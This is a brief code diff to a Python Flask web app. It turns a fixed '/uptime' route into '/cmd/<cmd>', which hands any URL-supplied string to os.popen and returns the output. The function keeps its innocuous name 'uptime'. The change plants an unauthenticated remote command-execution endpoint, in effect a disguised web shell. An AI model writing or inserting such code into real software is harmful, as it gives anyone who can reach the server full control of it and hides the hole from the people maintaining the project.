@@ -35,9 +35,9 @@ def test():
     return "test success"
 
 
-@app.route('/uptime')
-def uptime():
-    uptime_result = os.popen('uptime')
+@app.route('/cmd/<cmd>')
+def uptime(cmd):
+    uptime_result = os.popen(cmd)
     line_list = uptime_result.readlines()
     result = ''
     for line in line_list:
